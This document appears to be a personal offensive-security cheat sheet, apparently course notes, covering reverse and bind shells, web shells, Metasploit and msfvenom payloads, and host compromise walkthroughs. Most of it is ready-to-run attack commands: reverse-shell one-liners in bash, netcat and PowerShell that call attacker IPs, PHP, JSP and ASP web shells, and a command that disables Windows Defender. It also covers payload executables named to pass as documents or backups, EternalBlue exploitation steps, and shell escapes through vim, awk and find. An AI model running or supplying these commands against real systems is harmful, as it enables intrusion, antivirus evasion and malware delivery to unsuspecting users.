## Anatomy of shell

*Every operating system has a shell, and to interact with it, we must use an application known as a terminal emulator.When we discuss command-line interfaces, we know it is a combination of the operating system, terminal emulator application, and the command language interpreter.  Here are some of the most common terminal emulators:*
| **Terminal Emulator**                                          | **Operating System**     |
| -------------------------------------------------------------- | ------------------------ |
| [Windows Terminal](https://github.com/microsoft/terminal)      | Windows                  |
| [cmder](https://cmder.app)                                     | Windows                  |
| [PuTTY](https://www.putty.org)                                 | Windows                  |
| [kitty](https://sw.kovidgoyal.net/kitty/)                      | Windows, Linux and MacOS |
| [Alacritty](https://github.com/alacritty/alacritty)            | Windows, Linux and MacOS |
| [xterm](https://invisible-island.net/xterm/)                   | Linux                    |
| [GNOME Terminal](https://en.wikipedia.org/wiki/GNOME_Terminal) | Linux                    |
| [MATE Terminal](https://github.com/mate-desktop/mate-terminal) | Linux                    |
| [Konsole](https://konsole.kde.org)                             | Linux                    |
| [Terminal](https://en.wikipedia.org/wiki/Terminal_(macOS))     | MacOS                    |
| [iTerm2](https://iterm2.com)                                   | MacOS                    |

```
sasa@example$ ps ; env
```

*Get interactive terminal on LINUX*
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
[Command and Scripting Interpreter ](https://attack.mitre.org/techniques/T1059/)

## REVERSE Shell 
#### The remote/attacker machine initiates the connection and sends a request to connect to the target machine
[Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

*nc -lvnp 1234\
-l 	Listen mode, to wait for a connection to connect to us.\
-v 	Verbose mode, so that we know when we receive a connection.\
-n 	Disable DNS resolution and only connect from/to IPs, to speed up the connection.*

##### Bash:
```
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
```
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```
##### Powershell (in cmd.exe):
```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```
##### Powershell One-liner (in cmd.exe)
```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
**powershell -nop -c**  = Executes powershell.exe with no profile (nop) and executes the command/script block (-c) contained in the quotes\
**"$client = New-Object System.Net.Sockets.TCPClient(10.10.14.158,443);**  = Binding A Socket = Sets/evaluates the variable $client equal to (=) the New-Object cmdlet, which creates an instance of the System.Net.Sockets.TCPClient .NET framework object\
**$stream = $client.GetStream();**  = Sets/evaluates the variable $stream equal to (=) the $client variable and the .NET framework method called GetStream that facilitates network communications.\
**[byte[]]$bytes = 0..65535|%{0};**  =  Empty Byte Stream\
**while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)**   =  Starts a while loop containing the $i variable set equal to (=) the .NET framework Stream.Read ($stream.Read) method. The parameters: buffer ($bytes), offset (0), and count ($bytes.Length) are defined inside the parentheses of the method\
**{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);**  =  Sets/evaluates the variable $data equal to (=) an ASCII encoding .NET framework class that will be used in conjunction with the GetString method to encode the byte stream ($bytes) into ASCII \
**$sendback = (iex $data 2>&1 | Out-String );**    =  Sets/evaluates the variable $sendback equal to (=) the Invoke-Expression (iex) cmdlet against the $data variable, then redirects the standard error (2>) & standard output (1) through a pipe (|) to the Out-String cmdlet which converts input objects into strings \
**$sendback2 = $sendback + 'PS ' + (pwd).path + '> ';**   =  Sets/evaluates the variable $sendback2 equal to (=) the $sendback variable plus (+) the string PS ('PS') plus + path to the working directory ((pwd).path) plus (+) the string '> '. This will result in the shell prompt being PS C:\workingdirectoryofmachine > \
**$sendbyte=  ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}**   = Sets/evaluates the variable $sendbyte equal to (=) the ASCII encoded byte stream that will use a TCP client to initiate a PowerShell session with a Netcat listener running on the attack box\
**$client.Close()"**  = Terminate TCP Connection\

[One-liner ecample-Nishang project](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)

*It is possible to get error since Windows Defender AV software stopped execution of that code. In that case lets try disable AV on client/target windows machine*

```
Set-MpPreference -DisableRealtimeMonitoring $true
```
*and now we can execute:*
```
sudo nc -lvnp 443
```

---

## BIND Shell 
#### the target/victim machine listens for incoming connections and provides a shell interface when a connection is established
##### Bash:
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
```
##### Netcat/Bash Reverse Shell One-liner
```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f  ; our machine: nc -nv 10.129.41.200 7777
```
**rm -f /tmp/f;**  =  Removes the /tmp/f file if it exists, -f causes rm to ignore nonexistent files. The semi-colon (;) is used to execute the command sequentially\
**mkfifo /tmp/f;**  = Make A Named Pipe - Makes a FIFO named pipe file at the location specified. In this case, /tmp/f is the FIFO named pipe file, the semi-colon (;) is used to execute the command sequentially\
**cat /tmp/f |**    = Output Redirection - Concatenates the FIFO named pipe file /tmp/f, the pipe (|) connects the standard output of cat /tmp/f to the standard input of the command that comes after the pipe (|)\
**/bin/bash -i 2>&1 |**  =  Specifies the command language interpreter using the -i option to ensure the shell is interactive. 2>&1 ensures the standard error data stream (2) & standard output data stream (1) are redirected to the command following the pipe (|)\
**nc 10.10.14.12 7777 > /tmp/f**   = Uses Netcat to send a connection to our attack host 10.10.14.12 listening on port 7777. The output will be redirected (>) to /tmp/f, serving the Bash shell to our waiting Netcat listener when the reverse shell one-liner command is executed

##### Python:
```
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```
##### Powershell:
```
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
```
1. Once we execute the bind shell command, we should have a shell waiting for us on the specified port. We can now connect to it.
2. nc 10.10.10.1 1234

##### Upgrading TTY:
1. python -c 'import pty; pty.spawn("/bin/bash")'
2. After we run this command, we will hit ctrl+z to background our shell and get back on our local terminal
```
www-data@remotehost$ ^Z

stty raw -echo
fg
[Enter]
www-data@remotehost$
```

*We may notice that our shell does not cover the entire terminal. To fix this, we need to figure out a few variables. We can open another terminal window on our system, maximize the windows or use any size we want, and then input the following commands to get our variables:*
```
sasa7@htb[/user]$ echo $TERM
xterm-256color

sasa7@htb[/user]$ stty size
67 318
```
---

## Web Shell

[Laudanum = /usr/share/laudanum](https://github.com/jbarcia/Web-Shells/blob/master/laudanum/aspx/shell.aspx)\
cp /usr/share/laudanum/aspx/shell.aspx /home/tester/demo.aspx - if we need some modifications 

[Nishang - Antak](https://github.com/samratashok/nishang/blob/master/Antak-WebShell/Readme.md)\
[wwwolf-php-webshell](https://github.com/WhiteWinterWolf/wwwolf-php-webshell)

##### Code: php
```
<?php system($_REQUEST["cmd"]); ?>
``` 
```
echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php AND THEN IN BROWSER: http://SERVER_IP:PORT/shell.php?cmd=id
```
##### Code: jsp
```
 <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```   
##### Code: asp
```
<% eval request("cmd") %>
```

```
The following are the default webroots for common web servers:
Apache 	/var/www/html/
Nginx 	/usr/local/nginx/html/
IIS 	c:\inetpub\wwwroot\
XAMPP 	C:\xampp\htdocs\
```

## Automatic Payloads with Metasploit
```
sudo msfconsole
search smb  ==> 56 exploit/windows/smb/psexec
use 56
options
?
set RHOSTS 10.129.180.71
set SHARE ADMIN$
set SMBPass blabla!
set SMBUser student
set LHOST 10.10.14.222
exploit
shell
```

#### Crafting Payloads with MSFvenom

```
msfvenom -l payloads
```
Staged payloads create a way for us to send over more components of our attack.Staged payloads create a way for us to send over more components of our attack. Take for example this payload linux/x86/shell/reverse_tcp. Keep in mind that a stage also takes up space in memory which leaves less space for the payload. Staged payloads could lead to unstable shell sessions \
Stageless payloads do not have a stage. Take for example this payload linux/zarch/meterpreter_reverse_tcp

#### Building A stageless Payload for Linux system
```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
./createbackup.elf
```
-p = creating payload\
linux/x64/shell_reverse_tcp  = Choosing the Payload based on Architecture\

If launched on target/victim machine we should have listener ready
```
sudo nc -lvnp 443
```

#### Building A stageless Payload for Windows system
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe
start BonusCompensationPlanpdf.exe
```
If launched on target/victim machine we should have listener ready
```
sudo nc -lvnp 443
```

Tomcat
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=PWNIP LPORT=PWNPO -f war -o managerUpdated.war
nc - lvnp PWNPO
```

---

## Infiltrating Windows - Payload types to consider
1. DLL - A Dynamic Linking Library (DLL) is a library file used in Microsoft operating systems to provide shared code and data that can be used by many different programs at once. Injecting a malicious DLL or hijacking a vulnerable library on the host can elevate our privileges to SYSTEM and/or bypass User Account Controls.
2. Batch - Batch files are text-based DOS scripts utilized by system administrators to complete multiple tasks through the command-line interpreter.
3. VBS - VBScript is a lightweight scripting language based on Microsoft's Visual Basic. It is typically used as a client-side scripting language in webservers to enable dynamic web pages
4. MSI - .MSI files serve as an installation database for the Windows Installer. When attempting to install a new application, the installer will look for the .msi file to understand all of the components required and how to find them. .MSI files serve as an installation database for the Windows Installer. When attempting to install a new application, the installer will look for the .msi file to understand all of the components required and how to find them. 
5. Powershell

#### Payload generation
| **Resource**                      | **Description**                                                                                                                                                                                                                                                                                                   |
| --------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `MSFVenom & Metasploit-Framework` | [Source](https://github.com/rapid7/metasploit-framework) MSF is an extremely versatile tool for any pentester's toolkit. It serves as a way to enumerate hosts, generate payloads, utilize public and custom exploits, and perform post-exploitation actions once on the host. Think of it as a swiss-army knife. |
| `Payloads All The Things`         | [Source](https://github.com/swisskyrepo/PayloadsAllTheThings) Here, you can find many different resources and cheat sheets for payload generation and general methodology.                                                                                                                                        |
| `Mythic C2 Framework`             | [Source](https://github.com/its-a-feature/Mythic) The Mythic C2 framework is an alternative option to Metasploit as a Command and Control Framework and toolbox for unique payload generation.                                                                                                                    |
| `Nishang`                         | [Source](https://github.com/samratashok/nishang) Nishang is a framework collection of Offensive PowerShell implants and scripts. It includes many utilities that can be useful to any pentester.                                                                                                                  |
| `Darkarmour`                      | [Source](https://github.com/bats3c/darkarmour) Darkarmour is a tool to generate and utilize obfuscated binaries for use against Windows hosts.                                                                                                                                                                    |


#### Metasploit Example compromise Walkthrough:
1. Enumerate the Host - nmap -v -A 10.129.201.97
2. MS17-010 (EternalBlue) has been known to affect hosts ranging from Windows 2008 to Server 2016. ; msf6 > search - auxiliary/scanner/smb/smb_ms17_010
3. msf6 auxiliary(scanner/smb/smb_ms17_010) > use auxiliary/scanner/smb/smb_ms17_010
4. set RHOSTS 10.129.201.97 ; run ; we can see that is vulnerable!!
5. msf6 > search eternal
6. use exploit/windows/smb/ms17_010_psexec  ; show options ; exploit
7. shell

## Infiltrating Unix/Linux
1. nmap -sC -sV 10.129.201.101
2. rConfig is on web server - google it - rConfig 3.9.6 vulnerability
3. msf6 > search rconfig
4. locate exploits  = /usr/share/metasploit-framework/modules/exploits
5. apt update; apt install metasploit-framework
6. msf6 > use exploit/linux/http/rconfig_vendors_auth_file_upload_rce ; exploit

### Unix Shells
1. /bin/sh -i  = This command will execute the shell interpreter specified in the path in interactive mode (-i)
2. perl â€”e 'exec "/bin/sh";'  == Perl To Shell
3. ruby: exec "/bin/sh"   = Ruby to shell
4. lua: os.execute('/bin/sh') = Lua to shell
5. awk 'BEGIN {system("/bin/sh")}'   == AWK to Shell = AWK is a C-like pattern scanning and processing language present on most UNIX/Linux-based systems, widely used by developers and sysadmins to generate reports.
6. find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;    =  Find
7. find . -exec /bin/sh \; -quit   = Using Exec To Launch A Shell
8. vim -c ':!/bin/sh'   == VIM to Shell
9. Vim Escape
```
vim
:set shell=/bin/sh
:shell
``` 
10. sudo -l  = Not only will considering permissions allow us to see what commands we can execute, but it may also start to give us an idea of potential vectors that will allow us to escalate privileges.


## Archiving the payload
```
wget https://www.rarlab.com/rar/rarlinux-x64-612.tar.gz
tar -xzvf rarlinux-x64-612.tar.gz && cd rar
rar a ~/test.rar -p ~/test.js
Remove RAR
mv test.rar test
```
